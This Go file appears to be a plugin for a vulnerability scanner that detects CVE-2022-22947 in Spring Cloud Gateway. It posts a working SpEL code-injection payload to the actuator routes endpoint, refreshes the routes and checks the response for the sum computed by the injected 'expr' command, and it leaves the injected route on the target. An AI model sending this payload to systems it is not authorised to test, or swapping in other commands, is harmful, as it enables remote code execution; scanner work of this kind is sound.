package goplugin

import (
	utils "Yscanner/utils"
	"bytes"
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

func init() {
	Register("spring_cloud_gateway_rce_22947", &spring_cloud_gateway_rce_22947{})
}

type spring_cloud_gateway_rce_22947 struct{}

func (p *spring_cloud_gateway_rce_22947) Info() PluginInfo {
	return PluginInfo{
		Name:     "Spring Cloud Gateway 远程代码执行漏洞",
		VulnInfo: "VMware Spring Cloud Gateway是美国威睿（VMware）公司的提供了一个用于在 Spring WebFlux 之上构建 API 网关的库。其存在代码注入漏洞，远程攻击者可利用该漏洞发出恶意的请求并允许在远程主机上执行任意远程命令。",
		VulnID:   "CVE-2022-22947",
		Level:    "10.0 CRITICAL",
		URL:      "",
		Version:  "3.1.x：< 3.1.1；3.0.x：< 3.0.7",
		CWE:      "CWE-627	动态变量执行",
	}
}

func (p *spring_cloud_gateway_rce_22947) Check(netloc string) bool {
	router := utils.GenRandom(8)
	rand1 := utils.GenRandomInt(5)
	rand2 := utils.GenRandomInt(5)
	payload := fmt.Sprintf(`{
		"id": "%s",
		"filters": [{
		  "name": "AddResponseHeader",
		  "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"expr\",\"%d\",\"+\",\"%d\"}).getInputStream()))}"}
		}],
	  "uri": "http://example.com",
	  "order": 0
	  }`, router, rand1, rand2)

	url := netloc + "/actuator/gateway/routes/" + router
	req0, err := http.NewRequest("POST", url, bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req0.Header.Set("Content-Type", "application/json")
	resp0, err := utils.RequestDo(req0, true, 2)
	if err != nil {
		return false
	}

	if resp0.Other.StatusCode == 201 {
		req1, err := http.NewRequest("POST", netloc+"/actuator/gateway/refresh", nil)
		if err != nil {
			return false
		}
		req1.Header.Set("Content-Type", "application/json")
		resp1, err := utils.RequestDo(req1, true, 2)
		if err != nil || resp1.Other.StatusCode != 200 {
			return false
		}

		req2, err := http.NewRequest("GET", url, nil)
		if err != nil {
			return false
		}
		req2.Header.Set("Content-Type", "application/json")
		resp2, err := utils.RequestDo(req2, true, 2)
		if err != nil {
			return false
		}

		fmt.Println(resp2.ResponseRaw)
		if resp2.Other.StatusCode == 200 && strings.Contains(resp2.ResponseRaw, strconv.Itoa(rand1+rand2)) {
			return true
		}
		// todo 增加删除

	}

	return false
}
